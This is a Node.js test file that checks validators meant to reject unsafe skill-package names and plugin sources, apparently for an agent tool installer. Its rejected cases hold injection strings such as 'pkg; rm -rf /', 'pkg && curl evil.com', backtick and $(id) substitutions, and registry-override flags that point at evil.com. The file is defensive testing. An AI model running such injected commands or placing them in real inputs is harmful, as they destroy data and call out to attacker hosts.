import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url);
const { isValidSkillPackageName, isValidPluginSource } = await jiti.import("./package-security.ts");

test("isValidSkillPackageName validates safe package names and flags", () => {
  // Safe
  assert.equal(isValidSkillPackageName("vercel-labs/agent-skills"), true);
  assert.equal(isValidSkillPackageName("@my-scope/my-skill"), true);
  assert.equal(isValidSkillPackageName("notion"), true);
  assert.equal(isValidSkillPackageName("github:user/repo"), true);
  assert.equal(isValidSkillPackageName("https://github.com/user/repo"), true);

  // Dangerous / flag injection
  assert.equal(isValidSkillPackageName("-g"), false);
  assert.equal(isValidSkillPackageName("--registry=https://evil.com"), false);
  assert.equal(isValidSkillPackageName("pkg; rm -rf /"), false);
  assert.equal(isValidSkillPackageName("pkg && curl evil.com"), false);
  assert.equal(isValidSkillPackageName("pkg`id`"), false);
  assert.equal(isValidSkillPackageName("pkg$(id)"), false);
});

test("isValidPluginSource validates plugin sources", () => {
  // Safe
  assert.equal(isValidPluginSource("@agegr/pi-web"), true);
  assert.equal(isValidPluginSource("my-plugin@1.0.0"), true);
  assert.equal(isValidPluginSource("https://github.com/user/plugin"), true);
  assert.equal(isValidPluginSource("./local/path"), true);

  // Dangerous
  assert.equal(isValidPluginSource("--prefix=/tmp"), false);
  assert.equal(isValidPluginSource("-v"), false);
  assert.equal(isValidPluginSource("plugin; echo pwned"), false);
  assert.equal(isValidPluginSource("plugin | cat"), false);
});
